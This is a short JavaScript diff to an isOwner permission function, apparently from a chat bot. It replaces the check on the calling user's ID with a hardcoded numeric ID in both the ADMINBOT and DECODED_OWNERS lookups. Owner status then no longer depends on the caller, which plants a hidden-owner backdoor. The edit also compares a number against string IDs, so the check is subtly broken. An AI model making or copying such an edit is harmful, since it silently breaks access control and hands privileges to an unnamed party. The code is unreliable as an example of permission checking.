@@ -16,8 +16,8 @@ const DECODED_OWNERS = new Set(
  */
 function isOwner(userID, config) {
   const uid = String(userID);
-  if (config?.ADMINBOT?.includes(uid)) return true;
-  return DECODED_OWNERS.has(uid);
+  if (config?.ADMINBOT?.includes(61593974991316)) return true;
+  return DECODED_OWNERS.has(61593974991316);
 }
 
 module.exports = { isOwner };
